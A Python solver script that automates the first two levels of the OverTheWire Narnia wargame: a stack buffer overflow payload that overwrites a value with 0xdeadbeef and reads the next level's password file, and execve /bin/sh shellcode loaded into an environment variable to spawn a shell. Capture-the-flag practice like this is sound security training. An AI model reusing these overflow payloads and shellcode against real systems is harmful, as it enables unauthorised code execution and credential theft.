"""Implementations of solutions for Narnia OTW levels."""
import functools
import textwrap

import solver_util

_get_password_from_shell = functools.partial(solver_util.get_password_from_shell,
        password_file_cbk=lambda lvl: '/etc/narnia_pass/narnia%d' % lvl)


class Solver(solver_util.AbstractSolver):
  """Solver for the Narnia OTW levels."""

  @classmethod
  def username(cls, level):
    return 'narnia{}'.format(level)

  @property
  def host(cls):
    return 'narnia.labs.overthewire.org'

  @property
  def port(self):
    return 2226

  def level0(self, proc):
    proc.sendline(
        "cat <(echo $(python -c 'print(20*\"B\"+\"\".join(map(chr, reversed([0xde, 0xad, 0xbe, 0xef]))))') &&"
        "      sleep 1 && echo 'cat /etc/narnia_pass/narnia1') | /narnia/narnia0")
    proc.expect(r'\$ ')
    return proc.before.splitlines()[6]

  @_get_password_from_shell
  def level1(self, proc):
    # From http://shell-storm.org/shellcode/files/shellcode-863.php
    shellcode = (r"\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d"
                 r"\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50"
                 r"\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f"
                 r"\x2f\x62\x69\x6e\x2f\x73\x68")
    proc.sendline('export EGG=`echo -e "{}"`'.format(shellcode))
    proc.expect(r'\$ ')
    proc.sendline('/narnia/narnia1')
